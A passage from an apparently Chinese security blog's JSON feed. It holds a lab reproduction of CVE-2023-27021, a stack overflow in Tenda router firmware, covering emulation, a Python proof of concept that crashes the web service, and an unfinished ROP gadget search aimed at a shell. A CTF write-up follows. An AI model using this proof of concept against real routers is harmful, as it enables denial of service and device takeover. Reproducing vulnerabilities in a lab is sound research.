BuildID[sha1]=da2d1220742527123cd7cfeb41bbc4d2facbb3d5, with debug_info, not stripped</p>\n</blockquote>\n<p>接下来我们需要将其用 ida 打开。</p>\n<p><img data-src=\"/img/gccarm/image-20240510152016835.png\" alt=\"image-20240510152016835\"></p>\n<p>点击此处去生成符号表 (.riz)</p>\n<p>接下来就需要再次用 ida 装载我们要恢复符号表的程序。</p>\n<p><img data-src=\"/img/gccarm/image-20240510152245888.png\" alt=\"image-20240510152245888\"></p>\n<p><img data-src=\"/img/gccarm/image-20240510152301219.png\" alt=\"image-20240510152301219\"></p>\n<p>部分函数恢复成功。但是因为两个程序的内核版本不同，或者将 rizzo 识别能力有限的原因。没有恢复的很好，但是确实也是恢复了。</p>\n<blockquote>\n<p>特殊状况：arm 的栈底指针不一定为 R11, 也有可能是其他寄存器。</p>\n<p>​\t\t 因为我自己编出的程序的栈底指针为 R7</p>\n</blockquote>\n",
            "tags": [
                "技巧"
            ]
        },
        {
            "id": "https://yhuanhuan01.github.io/2024/05/10/CVE-2023-27021/",
            "url": "https://yhuanhuan01.github.io/2024/05/10/CVE-2023-27021/",
            "title": "CVE-2023-27021",
            "date_published": "2024-05-10T08:11:47.000Z",
            "content_html": "<p>CVE-2023-27021-tenda 路由器 - 栈溢出漏洞</p>\n<blockquote>\n<p>官网下载链接为：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudGVuZGEuY29tLmNuL2Rvd25sb2FkL2RldGFpbC0yNjgwLmh0bWw=\">https://www.tenda.com.cn/download/detail-2680.html</span></p>\n</blockquote>\n<h3 id=\"去官网下载相应的产品\"><a class=\"markdownIt-Anchor\" href=\"#去官网下载相应的产品\">#</a> 去官网下载相应的产品</h3>\n<p><img data-src=\"/img/CVE-2023-27021/image-20240508183219864.png\" alt=\"image-20240508183219864\"></p>\n<p>下载之后，使用 binwalk 进行解包。</p>\n<h3 id=\"解包\"><a class=\"markdownIt-Anchor\" href=\"#解包\">#</a> 解包</h3>\n<blockquote>\n<p>binwalk -Me filename.bin</p>\n</blockquote>\n<p>分解完之后的 <code>squashfs-root</code>  即为路由器的文件系统。</p>\n<blockquote>\n<p>tenda 路由器的 web 启动程序通常是 bin 目录下的 httpd 文件</p>\n</blockquote>\n<blockquote>\n<p>$ file httpd<br>\nhttpd: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped</p>\n</blockquote>\n<p>可以看到位 arm 架构的 32 位的可执行程序</p>\n<h3 id=\"执行程序\"><a class=\"markdownIt-Anchor\" href=\"#执行程序\">#</a> 执行程序</h3>\n<blockquote>\n<p>cp $(which qemu-arm-static) ./</p>\n<p>sudo chroot ./ ./qemu-arm-static ./bin/httpd</p>\n<p><img data-src=\"/img/CVE-2023-27021/image-20240508191156518.png\" alt=\"image-20240508191156518\"></p>\n</blockquote>\n<p>发现程序一直卡在这里，拖进 IDA 搜索字符串  <code>WeLoveLinux</code></p>\n<h3 id=\"查找原因\"><a class=\"markdownIt-Anchor\" href=\"#查找原因\">#</a> 查找原因</h3>\n<p><img data-src=\"/img/CVE-2023-27021/image-20240508193738684.png\" alt=\"image-20240508193738684\"></p>\n<p><img data-src=\"/img/CVE-2023-27021/image-20240508193627887.png\" alt=\"image-20240508193627887\"></p>\n<p>通过查看，在这里会 check_network。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">grep</span> <span class=\"token parameter variable\">-rn</span> <span class=\"token string\">\"check_network\"</span> *</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>grep: bin/netctrl: 匹配到二进制文件</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>grep: bin/multiWAN: 匹配到二进制文件</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>grep: bin/httpd: 匹配到二进制文件</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>grep: bin/phddns: 匹配到二进制文件</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>grep: bin/tendaupload: 匹配到二进制文件</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>grep: bin/logserver: 匹配到二进制文件</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>grep: lib/libcommon.so: 匹配到二进制文件</pre></td></tr></table></figure><p>去寻找该函数在那个库里。 <code>libcommon.so</code></p>\n<p><img data-src=\"/img/CVE-2023-27021/image-20240508194018818.png\" alt=\"image-20240508194018818\"></p>\n<p>函数主体</p>\n<p><img data-src=\"/img/CVE-2023-27021/image-20240508194346053.png\" alt=\"image-20240508194346053\"></p>\n<p>再次寻找 <code>get_eth_name</code></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">grep</span> <span class=\"token parameter variable\">-rn</span> <span class=\"token string\">\"get_eth_name\"</span> *</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>grep: bin/netctrl: 匹配到二进制文件</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>grep: bin/dnrd: 匹配到二进制文件</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>grep: bin/multiWAN: 匹配到二进制文件</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>grep: bin/dhcpcd: 匹配到二进制文件</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>grep: bin/httpd: 匹配到二进制文件</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>grep: bin/business_proc: 匹配到二进制文件</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>grep: bin/cfmd: 匹配到二进制文件</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>grep: bin/time_check: 匹配到二进制文件</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>grep: lib/libtpi.so: 匹配到二进制文件</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>grep: lib/libChipApi.so: 匹配到二进制文件</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>grep: lib/libcommon.so: 匹配到二进制文件</pre></td></tr></table></figure><p><img data-src=\"/img/CVE-2023-27021/image-20240508194612599.png\" alt=\"image-20240508194612599\"></p>\n<p><img data-src=\"/img/CVE-2023-27021/image-20240508201108424.png\" alt=\"image-20240508201108424\"></p>\n<p>从这里我们就可以看到需要什么类型的虚拟网络接口了。对应前面的 <code>get_eth_name(0)</code> ===&gt; 所以我们需要 br0</p>\n<h3 id=\"建立虚拟网络接口\"><a class=\"markdownIt-Anchor\" href=\"#建立虚拟网络接口\">#</a> 建立虚拟网络接口</h3>\n<p>通过 <code>ifconfig</code>  查看本地的网卡</p>\n<p><img data-src=\"/img/CVE-2023-27021/image-20240508183856764.png\" alt=\"image-20240508183856764\"></p>\n<blockquote>\n<p>使用以下命令建立虚拟网桥并进行 UP</p>\n</blockquote>\n<pre><code>sudo brctl addbr br0 \n这个命令创建一个新的虚拟网桥（bridge），名为br0。brctl是用于管理网络网桥的命令行工具，addbr选项用于添加一个新的网桥。这里，我们添加了一个名为br0的网桥。\n\nsudo brctl addif br0 ens33\n这个命令将物理网络接口ens33添加到刚刚创建的虚拟网桥br0中。addif选项用于将网络接口添加到网桥。这样，所有通过ens33接口的网络流量都会被转发到br0网桥，从而实现多个网络接口之间的通信。\n\nsudo ifconfig br0 up\n这个命令启用（激活）虚拟网桥br0。ifconfig是一个用于配置网络接口的命令行工具。在这里，我们使用up选项来激活br0网桥，使其可以开始处理网络流量。\n\nsudo dhclient br0\n这个命令为虚拟网桥br0分配一个动态IP地址。dhclient是一个用于请求和配置动态主机配置协议（DHCP）的命令行工具。在这里，我们使用dhclient为br0网桥获取一个动态IP地址，这样它就可以与其他网络设备进行通信。\n\nsudo tunctl -t br0 -u 'whoami'\n这个命令创建一个名为br0的虚拟网络接口。tunctl是一个用于管理虚拟网络设备的命令行工具，通常用于创建和管理TUN/TAP设备。在这里，我们使用-t选项来指定设备名称（br0），-u选项来指定拥有该设备的用户的用户名。'whoami'是一个shell命令，用于输出当前用户的用户名，因此这里会创建一个虚拟网络接口，其所有者为执行命令的当前用户。\n\nsudo ifconfig br0 192.168.65.1/24\n这个命令为虚拟网络接口br0分配一个静态IP地址。ifconfig是一个用于配置网络接口的命令行工具。在这里，我们使用它来为br0接口指定一个IP地址（192.168.65.1）和一个子网掩码（/24）。这意味着网络接口将使用192.168.65.1作为其IP地址，子网掩码为255.255.255.0。\n&gt; sudo ifconfig br0 down &amp;&amp; sudo brctl delbr br0 停止网络接口并删除\n&gt; sudo netstat -tulnp | grep 192.168.65.1:80 查找对应的服务\n&gt; kill -9 PID kill 命令来停止它\n&gt; sudo netplan apply ens33无ip修复\n</code></pre>\n<p><img data-src=\"/img/CVE-2023-27021/image-20240508184626432.png\" alt=\"image-20240508184626432\"></p>\n<h3 id=\"再次出现问题\"><a class=\"markdownIt-Anchor\" href=\"#再次出现问题\">#</a> 再次出现问题</h3>\n<p><img data-src=\"/img/CVE-2023-27021/image-20240508201807056.png\" alt=\"image-20240508201807056\"></p>\n<h3 id=\"查找原因-2\"><a class=\"markdownIt-Anchor\" href=\"#查找原因-2\">#</a> 查找原因</h3>\n<p><img data-src=\"/img/CVE-2023-27021/image-20240508204305586.png\" alt=\"image-20240508204305586\"></p>\n<p><img data-src=\"/img/CVE-2023-27021/image-20240508204329574.png\" alt=\"image-20240508204329574\"></p>\n<pre><code>GPT:\nsocket(1, 1, 0): 这个函数需要三个参数：\n\n第一个参数是域（domain），它指定了socket的协议族。在这个例子中，1代表AF_INET，即IPv4的因特网协议族。\n第二个参数是类型（type），它指定了socket的通信方式。在这个例子中，1代表SOCK_STREAM，表示一个面向连接的、可靠的字节流socket，通常用于TCP协议。\n第三个参数是协议（protocol），它指定了socket使用的特定协议。在这个例子中，0表示让系统选择默认协议。对于SOCK_STREAM类型的socket，通常使用TCP协议。\n</code></pre>\n<p>所以我们暂时无法依照现在的环境去修改网络状况。</p>\n<p>但是还有一种办法我们可以修改执行逻辑。</p>\n<p><img data-src=\"/img/CVE-2023-27021/image-20240508205103089.png\" alt=\"image-20240508205103089\"></p>\n<p>所以我们去修改这两块的逻辑</p>\n<p><img data-src=\"/img/CVE-2023-27021/image-20240508211506399.png\" alt=\"image-20240508211506399\"></p>\n<blockquote>\n<p>sudo chroot ./ ./qemu-arm-static ./bin/httpd</p>\n<p><img data-src=\"/img/CVE-2023-27021/image-20240508211557449.png\" alt=\"image-20240508211557449\"></p>\n</blockquote>\n<p>此时就可以正常访问了</p>\n<p>但是当我们正常访问时，发现网页是 404，此时我们让下面的 webroot_ro 的里面文件刷进去即可。</p>\n<h3 id=\"测试漏洞\"><a class=\"markdownIt-Anchor\" href=\"#测试漏洞\">#</a> 测试漏洞</h3>\n<p><img data-src=\"/img/CVE-2023-27021/image-20240508220917436.png\" alt=\"image-20240508220917436\"></p>\n<blockquote>\n<p>使用 IDA 逆向 httpd 文件，寻找可以造成栈溢出的函数。挖掘栈溢出漏洞，通常我们要从一些危险函数入手，第一类函数是 scanf，可能产生格式化字符串溢出漏洞，第二类是 strcpy、strcat、sprintf 等字符串拷贝函数。根据 tenda 的历史 CVE 漏洞，strcpy 函数产生的漏洞比较多，所以我们从 strcpy 入手举例。</p>\n</blockquote>\n<p><img data-src=\"/img/CVE-2023-27021/image-20240508221310337.png\" alt=\"image-20240508221310337\"></p>\n<p>我们通过这个去寻找防火墙的漏洞</p>\n<p><img data-src=\"/img/CVE-2023-27021/image-20240508222124288.png\" alt=\"image-20240508222124288\"></p>\n<p>src 直接去复制到 dest 里，后续也没有对 dest 的长度进行检测。</p>\n<p>还需要我们去确定这个是否可以进行传入，sub_2BA8C 是 WebGetvar (goahead 的函数，暂时还不会恢复符号表)，所以我们是可以通过这个函数进行传参的。接下来我们进行测试。</p>\n<p><img data-src=\"/img/CVE-2023-27021/image-20240509095758402.png\" alt=\"image-20240509095758402\"></p>\n<p><img data-src=\"/img/CVE-2023-27021/image-20240509095531606.png\" alt=\"image-20240509095531606\"></p>\n<p>故猜测以及目录为 goform</p>\n<p>测试 POC 如下：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>url <span class=\"token operator\">=</span> <span class=\"token string\">\"http://192.168.65.1/goform/SetFirewallCfg\"</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>header <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token string\">\"Content-Type\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"application/x-www-form-urlencoded; charset=UTF-8\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token string\">\"Cookie\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"password=hdjcvb\"</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">\"A\"</span> <span class=\"token operator\">*</span> <span class=\"token number\">500</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>data <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"firewallEn\"</span><span class=\"token punctuation\">:</span> payload<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>response <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> headers<span class=\"token operator\">=</span>header<span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span>data<span class=\"token punctuation\">,</span> timeout<span class=\"token operator\">=</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>response<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>执行 POC 后：</p>\n<p><img data-src=\"/img/CVE-2023-27021/image-20240509100524266.png\" alt=\"image-20240509100524266\"></p>\n<p><img data-src=\"/img/CVE-2023-27021/image-20240509100543004.png\" alt=\"image-20240509100543004\"></p>\n<p><img data-src=\"/img/CVE-2023-27021/image-20240509100606754.png\" alt=\"image-20240509100606754\"></p>\n<p>所以可以得知存在拒绝服务漏洞。</p>\n<h3 id=\"利用漏洞-gdb调试\"><a class=\"markdownIt-Anchor\" href=\"#利用漏洞-gdb调试\">#</a> 利用漏洞 - gdb 调试</h3>\n<p><img data-src=\"/img/CVE-2023-27021/image-20240509075854662.png\" alt=\"image-20240509075854662\"></p>\n<p>测试漏洞的保护</p>\n<p>因为 NX 保护开启，无法向栈上写入 shellcode 去执行。可以去利用 rop，去进行获取 shell</p>\n<h4 id=\"配置gdb动态调试环境\"><a class=\"markdownIt-Anchor\" href=\"#配置gdb动态调试环境\">#</a> 配置 gdb 动态调试环境</h4>\n<blockquote>\n<p>sudo chroot ./ ./qemu-arm-static -g 9999 ./bin/httpd</p>\n</blockquote>\n<p>开启另一个终端</p>\n<blockquote>\n<p>gdb-multiarch ./bin/httpd</p>\n<p>pwndbg&gt; set architecture arm</p>\n<p>pwndbg&gt; target remote :9999</p>\n<blockquote>\n<p>sudo lsof -i :9999 查看 gdb 绑定端口的 PID</p>\n</blockquote>\n</blockquote>\n<p>这样我们就可以去调试程序了</p>\n<h4 id=\"利用poc去劫持ret\"><a class=\"markdownIt-Anchor\" href=\"#利用poc去劫持ret\">#</a> 利用 POC 去劫持 ret</h4>\n<p>进入 gdb 调试后我们先 n 上两步，然后执行 POC 两次，观测 gdb</p>\n<p><img data-src=\"/img/CVE-2023-27021/image-20240509102326859.png\" alt=\"image-20240509102326859\"></p>\n<p>发现返回地址确实被我们去劫持到一个我们人为输入的值。接下来就是测试我们如何将这个改成一个可获取 shell 的 rop</p>\n<h3 id=\"利用漏洞-获取shell\"><a class=\"markdownIt-Anchor\" href=\"#利用漏洞-获取shell\">#</a> 利用漏洞 - 获取 shell</h3>\n<ol>\n<li>获取返回地址据输入偏移量</li>\n</ol>\n<p><img data-src=\"/img/CVE-2023-27021/image-20240509103042769.png\" alt=\"image-20240509103042769\"></p>\n<ol start=\"2\">\n<li>寻找 libc 基址</li>\n</ol>\n<p>使用 vmmap 看内存信息</p>\n<p><img data-src=\"/img/CVE-2023-27021/image-20240509103454383.png\" alt=\"image-20240509103454383\"></p>\n<p>猜测箭头所指出为 libc 基址。</p>\n<ol start=\"3\">\n<li>寻找 gadget</li>\n</ol>\n<blockquote>\n<p>使用 ROPgadget，在 libc 中找一个可以控制 r0 的 gadget</p>\n</blockquote>\n<pre><code>ROPgadget --binary ./lib/libc.so.0 | grep &quot;mov r0, sp&quot;\n</code></pre>\n<p><img data-src=\"/img/CVE-2023-27021/image-20240509104401520.png\" alt=\"image-20240509104401520\"></p>\n<blockquote>\n<p>再在 libc 中找一个可以 pop 到 r3 的 gadget</p>\n</blockquote>\n<pre><code>ROPgadget --binary ./lib/libc.so.0 --only &quot;pop&quot;|grep r3\n</code></pre>\n<p><img data-src=\"/img/CVE-2023-27021/image-20240509104744796.png\" alt=\"image-20240509104744796\"></p>\n<p>后续补充…</p>\n",
            "tags": [
                "CVE-复现系列"
            ]
        },
        {
            "id": "https://yhuanhuan01.github.io/2024/04/15/%E5%8C%97%E5%8C%BA-%E6%95%B0%E4%BF%A1%E6%9D%AFWP/",
            "url": "https://yhuanhuan01.github.io/2024/04/15/%E5%8C%97%E5%8C%BA-%E6%95%B0%E4%BF%A1%E6%9D%AFWP/",
            "title": "北区-数信杯WP",
            "date_published": "2024-04-15T08:04:30.000Z",
            "content_html": "<h1 id=\"第二届数据安全大赛暨首届数信杯_wp\"><a class=\"markdownIt-Anchor\" href=\"#第二届数据安全大赛暨首届数信杯_wp\">#</a> 第二届数据安全大赛暨首届 “数信杯”_WP</h1>\n<p><img data-src=\"/img/%E6%95%B0%E4%BF%A1%E6%9D%AFwp/image-20240414163012378.png\" alt=\"image-20240414163012378\"></p>\n<h2 id=\"magic-audio\"><a class=\"markdownIt-Anchor\" href=\"#magic-audio\">#</a> Magic Audio</h2>\n<blockquote>\n<p>SSTV 解密：</p>\n</blockquote>\n<p><img data-src=\"/img/%E6%95%B0%E4%BF%A1%E6%9D%AFwp/30A50ACF8D6CFF45F112140CE485F4B5.png\" alt=\"img\"></p>\n<blockquote>\n<p>binwalk 分离</p>\n</blockquote>\n<p><img data-src=\"/img/%E6%95%B0%E4%BF%A1%E6%9D%AFwp/691BCBB7B8BE2A80F88467915DB7A84A.png\" alt=\"img\"></p>\n<blockquote>\n<p>将菜就多练当作密钥输入压缩包得到 flag</p>\n</blockquote>\n<h2 id=\"rrrrcccc\"><a class=\"markdownIt-Anchor\" href=\"#rrrrcccc\">#</a> rrrrcccc</h2>\n<blockquote>\n<p>upx 去壳后打开程序，分析就是两次异或，一次 rc4 一次异或 key，我 patch 密文让他异或 rc4 后，手动异或一下 key 即可</p>\n</blockquote>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>a <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>  <span class=\"token number\">0x57</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x61</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x74</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x61</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x72</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x65</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x79</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x75</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token number\">0x72</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x65</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x63</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x72</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x79</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x70</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x74</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x69</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6F</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token number\">0x6E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x26</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x64</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x65</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x63</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x72</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x79</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x70</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x74</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x69</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token number\">0x6F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x62</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x61</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x73</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x69</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x63</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x73</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>b <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>  <span class=\"token number\">0x31</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x13</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x16</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x56</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x43</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token number\">0x4B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x57</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x13</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x41</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0A</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token number\">0x5F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x42</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x56</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x56</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x07</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x44</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x41</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x41</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x50</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token number\">0x5F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x56</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x50</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x56</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x59</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x52</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0E</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\"># print(len(a))</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\"># print(len(b))</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token operator\">^</span>b<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>end<span class=\"token operator\">=</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"classic_image_steganography\"><a class=\"markdownIt-Anchor\" href=\"#classic_image_steganography\">#</a> Classic_image_steganography</h2>\n<p><img data-src=\"/img/%E6%95%B0%E4%BF%A1%E6%9D%AFwp/image-20240414161818188.png\" alt=\"image-20240414161818188\"></p>\n<blockquote>\n<p>修改文件头</p>\n</blockquote>\n<p><img data-src=\"/img/%E6%95%B0%E4%BF%A1%E6%9D%AFwp/image-20240414161928432.png\" alt=\"image-20240414161928432\"></p>\n<blockquote>\n<p>给了一张空白的图片，修改高度即可看到下方 flag</p>\n</blockquote>\n<p><img data-src=\"/img/%E6%95%B0%E4%BF%A1%E6%9D%AFwp/image-20240414162012262.png\" alt=\"image-20240414162012262\"></p>\n<p><img data-src=\"/img/%E6%95%B0%E4%BF%A1%E6%9D%AFwp/image-20240414162019739.png\" alt=\"image-20240414162019739\"></p>\n<h2 id=\"不安全的u盘1\"><a class=\"markdownIt-Anchor\" href=\"#不安全的u盘1\">#</a> 不安全的 U 盘.1</h2>\n<p><img data-src=\"/img/%E6%95%B0%E4%BF%A1%E6%9D%AFwp/image-20240414162247434.png\" alt=\"image-20240414162247434\"></p>\n<h2 id=\"不安全的u盘2\"><a class=\"markdownIt-Anchor\" href=\"#不安全的u盘2\">#</a> 不安全的 U 盘.2</h2>\n<p><img data-src=\"/img/%E6%95%B0%E4%BF%A1%E6%9D%AFwp/image-20240414162334045.png\" alt=\"image-20240414162334045\"></p>\n<h2 id=\"不安全的u盘3\"><a class=\"markdownIt-Anchor\" href=\"#不安全的u盘3\">#</a> 不安全的 U 盘.3</h2>\n<p><img data-src=\"/img/%E6%95%B0%E4%BF%A1%E6%9D%AFwp/image-20240414162449852.png\" alt=\"image-20240414162449852\"></p>\n<h2 id=\"不安全的u盘4\"><a class=\"markdownIt-Anchor\" href=\"#不安全的u盘4\">#</a> 不安全的 U 盘.4</h2>\n<p>题目提到了后渗透，同时涉及到了远程 IP 和端口，肯定是搭建代理了，直接检索最常用的代理软件 frp 配置文件默认参数名 remote_port 之类的 ，得到答案 118.180.126.13_6770</p>\n<p><img data-src=\"/img/%E6%95%B0%E4%BF%A1%E6%9D%AFwp/8c5c8716-0941-4c3a-a785-eecc7a252691.png\" alt=\"image-20240414161028946\"></p>\n<h2 id=\"网站的数据绝对安全1\"><a class=\"markdownIt-Anchor\" href=\"#网站的数据绝对安全1\">#</a> 网站的数据绝对安全.1</h2>\n<blockquote>\n<p>流量包 11 流</p>\n</blockquote>\n<p><img data-src=\"/img/%E6%95%B0%E4%BF%A1%E6%9D%AFwp/image-20240414161028946.png\" alt=\"image-20240414161028946\"></p>\n<blockquote>\n<p>得到用户名</p>\n</blockquote>\n<h2 id=\"网站的数据绝对安全2\"><a class=\"markdownIt-Anchor\" href=\"#网站的数据绝对安全2\">#</a> 网站的数据绝对安全.2</h2>\n<p>导出所有的 http 文件。</p>\n<p><img data-src=\"/img/%E6%95%B0%E4%BF%A1%E6%9D%AFwp/image-20240414161118780.png\" alt=\"image-20240414161118780\"></p>\n<h2 id=\"bitcoin4\"><a class=\"markdownIt-Anchor\" href=\"#bitcoin4\">#</a> Bitcoin.4</h2>\n<blockquote>\n<p>gpt 秒了</p>\n</blockquote>\n<p><img data-src=\"/img/%E6%95%B0%E4%BF%A1%E6%9D%AFwp/image-20240414161313115.png\" alt=\"image-20240414161313115\"></p>\n<h2 id=\"easyjava\"><a class=\"markdownIt-Anchor\" href=\"#easyjava\">#</a> easyjava</h2>\n<p>某个精通百家姓的开发者把自己的小秘密藏在了附件中，来查查他有什么秘密。</p>\n<p>给的附件为.hprof 